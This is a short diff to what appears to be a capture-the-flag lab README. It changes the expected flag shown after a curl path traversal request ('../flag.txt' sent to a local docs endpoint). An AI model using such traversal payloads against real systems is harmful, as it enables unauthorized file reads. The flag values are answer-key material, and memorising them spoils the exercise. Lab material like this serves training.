@@ -42,7 +42,7 @@ curl --path-as-is "http://localhost:5000/docs?name=../flag.txt"
 Expected output:
 
 ```
-FLAG{P4TH_TR4V3RS4L_L3V3L_1}
+FLAG{FETCHLY_UNLOCKED_THE_VAULT}
 ```
 
 > The flag is **not** in the repo on purpose — it is created inside the Docker
